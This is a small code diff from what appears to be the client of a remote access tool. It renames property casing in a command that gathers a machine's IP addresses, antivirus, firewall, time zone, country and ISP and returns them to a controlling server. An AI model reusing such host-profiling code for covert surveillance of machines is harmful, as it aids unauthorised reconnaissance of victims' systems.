@@ -359,17 +359,17 @@ namespace xClient.Core.Commands
                     "LAN IP Address",
                     DevicesHelper.GetLanIp(),
                     "WAN IP Address",
-                    GeoLocationHelper.GeoInfo.ip,
+                    GeoLocationHelper.GeoInfo.Ip,
                     "Antivirus",
                     SystemHelper.GetAntivirus(),
                     "Firewall",
                     SystemHelper.GetFirewall(),
                     "Time Zone",
-                    GeoLocationHelper.GeoInfo.timezone,
+                    GeoLocationHelper.GeoInfo.Timezone,
                     "Country",
-                    GeoLocationHelper.GeoInfo.country,
+                    GeoLocationHelper.GeoInfo.Country,
                     "ISP",
-                    GeoLocationHelper.GeoInfo.isp
+                    GeoLocationHelper.GeoInfo.Isp
                 };
 
                 new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
